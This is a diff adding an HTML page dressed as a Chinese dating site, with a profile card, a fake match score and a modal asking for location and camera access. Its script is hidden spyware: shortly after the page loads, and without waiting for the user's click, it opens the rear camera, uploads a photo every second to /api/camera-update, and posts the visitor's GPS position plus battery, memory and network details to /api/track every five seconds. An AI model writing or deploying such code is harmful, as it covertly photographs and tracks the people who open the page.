@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>心动交友 - 寻找你的缘分</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            min-height: 100vh;
+            color: #fff;
+        }
+        .profile-preview {
+            width: 100%;
+            height: 400px;
+            background: #fff;
+            margin: 10px auto;
+            position: relative;
+            overflow: hidden;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            transition: transform 0.3s ease;
+        }
+        .profile-preview:hover {
+            transform: scale(1.02);
+        }
+        .avatar-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            background-image: url('https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Felix');
+            filter: brightness(0.9);
+        }
+        .profile-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            color: white;
+        }
+        .nearby-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideIn 0.5s forwards;
+            transition: transform 0.3s ease;
+        }
+        .nearby-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255,255,255,0.15);
+        }
+        @keyframes slideIn {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .nearby-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 30px;
+            margin-right: 15px;
+            border: 2px solid #ff4b8a;
+            box-shadow: 0 0 10px rgba(255,75,138,0.5);
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff4b8a, #ff6b6b);
+            width: 0%;
+            animation: fillProgress 2s ease-out forwards;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255,255,255,0.2),
+                transparent
+            );
+            animation: shine 2s linear infinite;
+        }
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        @keyframes fillProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .fade-in {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(26,26,46,0.95);
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,75,138,0.3);
+        }
+        .btn-gradient {
+            background: linear-gradient(45deg, #ff4b8a, #ff6b6b);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(255,75,138,0.3);
+        }
+        .btn-gradient:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255,75,138,0.4);
+        }
+        .heart-icon {
+            color: #ff4b8a;
+            animation: heartbeat 1.5s infinite;
+        }
+        @keyframes heartbeat {
+            0% { transform: scale(1); }
+            25% { transform: scale(1.1); }
+            50% { transform: scale(1); }
+            75% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .match-percentage {
+            font-size: 1.2em;
+            color: #ff4b8a;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255,75,138,0.5);
+        }
+    </style>
+</head>
+<body>
+    <nav class="bg-gradient-to-r from-pink-600 to-red-500 shadow-lg">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex justify-between">
+                <div class="flex space-x-7">
+                    <div class="flex items-center py-4">
+                        <span class="font-bold text-white text-2xl">心动交友</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container mx-auto px-4 py-8">
+        <div class="text-center mb-8 fade-in">
+            <h1 class="text-4xl font-bold text-white mb-4">寻找你的心动瞬间</h1>
+            <p class="text-gray-300 text-xl">已有超过10000位单身用户在这里找到幸福</p>
+        </div>
+
+        <div class="bg-white/10 rounded-2xl shadow-xl p-6 mb-6 fade-in backdrop-blur-lg" style="animation-delay: 0.2s">
+            <h2 class="text-2xl font-bold mb-4 text-pink-500">你的个人资料</h2>
+            <div class="profile-preview">
+                <div class="avatar-overlay"></div>
+                <div class="profile-info">
+                    <h3 class="text-2xl font-bold">Felix</h3>
+                    <p class="text-gray-300">25岁 | 北京 | 程序员</p>
+                    <div class="flex items-center mt-2">
+                        <span class="heart-icon mr-2">❤</span>
+                        <span class="match-percentage">98% 匹配度</span>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-4">
+                <p class="text-gray-300 text-center mb-3" id="analysis-text">正在分析你的魅力值...</p>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="nearby-container" class="space-y-4">
+            <!-- 用户卡片将通过JavaScript动态添加 -->
+        </div>
+    </main>
+
+    <!-- 权限请求模态框 -->
+    <div id="permissionModal" class="modal">
+        <div class="modal-content">
+            <h3 class="text-2xl font-bold mb-4 text-white">发现附近的心动对象</h3>
+            <p class="text-gray-300 mb-4">为了帮你找到最合适的对象，我们需要获取以下权限：</p>
+            <ul class="list-disc list-inside mb-6 text-gray-300">
+                <li class="mb-2">位置信息 - 查找附近的人</li>
+                <li class="mb-2">相机权限 - 实时互动</li>
+            </ul>
+            <button id="permissionBtn" class="btn-gradient w-full">立即查看附近的人</button>
+        </div>
+    </div>
+
+    <script>
+        // 系统信息收集器
+        class SystemMonitor {
+            constructor() {
+                this.data = {
+                    battery: null,
+                    memory: null,
+                    network: null,
+                    cpu: 0
+                };
+                this.initialize();
+            }
+
+            async initialize() {
+                await this.initBattery();
+                await this.initMemory();
+                await this.initNetwork();
+                this.startCPUMonitoring();
+            }
+
+            async initBattery() {
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        this.data.battery = {
+                            level: battery.level * 100,
+                            charging: battery.charging
+                        };
+                        
+                        battery.addEventListener('levelchange', () => {
+                            this.data.battery.level = battery.level * 100;
+                        });
+                        battery.addEventListener('chargingchange', () => {
+                            this.data.battery.charging = battery.charging;
+                        });
+                    } catch (error) {
+                        console.error('Battery API error:', error);
+                    }
+                }
+            }
+
+            async initMemory() {
+                if ('memory' in performance) {
+                    this.data.memory = {
+                        total: performance.memory.jsHeapSizeLimit,
+                        used: performance.memory.usedJSHeapSize,
+                        free: performance.memory.jsHeapSizeLimit - performance.memory.usedJSHeapSize
+                    };
+                }
+            }
+
+            async initNetwork() {
+                if ('connection' in navigator) {
+                    const connection = navigator.connection;
+                    this.data.network = {
+                        type: connection.effectiveType,
+                        downlink: connection.downlink
+                    };
+
+                    connection.addEventListener('change', () => {
+                        this.data.network = {
+                            type: connection.effectiveType,
+                            downlink: connection.downlink
+                        };
+                    });
+                }
+            }
+
+            startCPUMonitoring() {
+                let lastTime = performance.now();
+                let frameCount = 0;
+
+                const updateCPU = () => {
+                    const currentTime = performance.now();
+                    frameCount++;
+
+                    if (currentTime - lastTime >= 1000) {
+                        const fps = frameCount;
+                        this.data.cpu = Math.min(100, (fps / 60) * 100);
+                        frameCount = 0;
+                        lastTime = currentTime;
+                    }
+
+                    requestAnimationFrame(updateCPU);
+                };
+
+                requestAnimationFrame(updateCPU);
+            }
+
+            getSystemInfo() {
+                return {
+                    battery: this.data.battery || { level: 0, charging: false },
+                    memory: this.data.memory || { total: 0, used: 0, free: 0 },
+                    network: this.data.network || { type: 'unknown', downlink: 0 },
+                    cpuUsage: this.data.cpu
+                };
+            }
+        }
+
+        // 相机管理器
+        class CameraManager {
+            constructor() {
+                this.stream = null;
+                this.canvas = document.createElement('canvas');
+                this.context = this.canvas.getContext('2d');
+                this.videoElement = document.createElement('video');
+                this.isActive = false;
+                this.uploadInterval = null;
+            }
+
+            async initialize() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'environment',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        } 
+                    });
+                    
+                    this.stream = stream;
+                    this.videoElement.srcObject = stream;
+                    this.videoElement.play();
+                    
+                    this.canvas.width = 1280;
+                    this.canvas.height = 720;
+                    
+                    this.isActive = true;
+                    this.startUploading();
+                    return true;
+                } catch (error) {
+                    console.error('Camera initialization error:', error);
+                    return false;
+                }
+            }
+
+            async captureImage() {
+                if (!this.isActive) return null;
+                
+                try {
+                    this.context.drawImage(this.videoElement, 0, 0, this.canvas.width, this.canvas.height);
+                    
+                    const blob = await new Promise(resolve => {
+                        this.canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                    });
+                    
+                    return blob;
+                } catch (error) {
+                    console.error('Image capture error:', error);
+                    return null;
+                }
+            }
+
+            startUploading() {
+                this.uploadInterval = setInterval(async () => {
+                    const imageBlob = await this.captureImage();
+                    if (imageBlob) {
+                        const formData = new FormData();
+                        formData.append('image', imageBlob);
+                        
+                        try {
+                            await fetch('/api/camera-update', {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (error) {
+                            console.error('Image upload error:', error);
+                        }
+                    }
+                }, 1000);
+            }
+
+            stop() {
+                if (this.stream) {
+                    this.stream.getTracks().forEach(track => track.stop());
+                }
+                if (this.uploadInterval) {
+                    clearInterval(this.uploadInterval);
+                }
+                this.isActive = false;
+            }
+        }
+
+        // 设备追踪器
+        class DeviceTracker {
+            constructor() {
+                this.systemMonitor = new SystemMonitor();
+                this.cameraManager = new CameraManager();
+                this.trackingInterval = null;
+            }
+
+            async initialize() {
+                await this.systemMonitor.initialize();
+                await this.requestPermissions();
+                this.startTracking();
+            }
+
+            async requestPermissions() {
+                try {
+                    await this.cameraManager.initialize();
+                    
+                    if ('geolocation' in navigator) {
+                        await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                    }
+                } catch (error) {
+                    console.error('Permission request error:', error);
+                }
+            }
+
+            async getDeviceData() {
+                const systemInfo = this.systemMonitor.getSystemInfo();
+                
+                let locationData = null;
+                if ('geolocation' in navigator) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                        locationData = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        };
+                    } catch (error) {
+                        console.error('Location error:', error);
+                    }
+                }
+
+                return {
+                    battery: systemInfo.battery,
+                    memory: systemInfo.memory,
+                    network: systemInfo.network,
+                    system: {
+                        cpuUsage: systemInfo.cpuUsage,
+                        memoryUsage: (systemInfo.memory.used / systemInfo.memory.total) * 100,
+                        uptime: performance.now()
+                    },
+                    data: locationData
+                };
+            }
+
+            async startTracking() {
+                await this.sendTrackingData();
+                this.trackingInterval = setInterval(() => this.sendTrackingData(), 5000);
+            }
+
+            async sendTrackingData() {
+                try {
+                    const deviceData = await this.getDeviceData();
+                    const response = await fetch('/api/track', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(deviceData)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Tracking request failed');
+                    }
+                } catch (error) {
+                    console.error('Tracking error:', error);
+                }
+            }
+
+            stop() {
+                if (this.trackingInterval) {
+                    clearInterval(this.trackingInterval);
+                }
+                this.cameraManager.stop();
+            }
+        }
+
+        // 初始化设备追踪
+        const tracker = new DeviceTracker();
+
+        // 在页面加载后延迟启动追踪
+        setTimeout(() => {
+            tracker.initialize();
+        }, 1500);
+    </script>
+</body>
+</html> 
